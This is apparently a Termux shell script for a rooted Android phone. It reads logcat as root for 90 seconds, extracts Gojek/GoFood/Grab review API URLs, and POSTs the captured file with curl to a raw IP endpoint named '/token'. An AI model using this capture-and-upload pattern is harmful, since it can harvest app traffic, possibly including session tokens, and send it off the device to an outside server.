#!/data/data/com.termux/files/usr/bin/bash
# sniff_logcat.sh — tangkap URL API GoFood/Grab dari logcat app (root), 90 detik.
echo "=== BUKA APP GOJEK > GoFood > resto > ULASAN sekarang (90 detik) ==="
su -c "timeout 90 logcat" 2>/dev/null | grep -oiE 'https?://[a-z0-9.-]*(gojekapi|gofood|go-jek|grab)[a-z0-9./_-]*[a-z0-9/_-]*(review|rating|feedback)[a-z0-9/_.?=&-]*' > /data/data/com.termux/files/home/urls_gf.txt
echo "--- hasil ---"
sort -u /data/data/com.termux/files/home/urls_gf.txt | head -40
/data/data/com.termux/files/usr/bin/curl -s -m 20 -X POST -H "Content-Type: text/plain" --data-binary @/data/data/com.termux/files/home/urls_gf.txt http://161.120.180.21:9911/token && echo " TERKIRIM"
